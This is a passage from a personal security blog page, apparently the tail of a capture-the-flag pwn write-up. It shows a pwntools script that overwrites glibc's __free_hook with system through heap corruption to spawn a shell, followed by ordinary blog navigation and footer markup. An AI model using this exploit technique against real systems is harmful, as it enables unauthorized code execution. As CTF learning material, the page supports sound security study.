= libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;malloc_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(free_hook-<span class="number">0x20</span>))</span><br><span class="line">payload = p64(free_hook-<span class="number">0x10</span>)</span><br><span class="line">add(payload)</span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(system_libc)</span><br><span class="line">add(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/31/">31</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">309</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">161</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">68:36</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
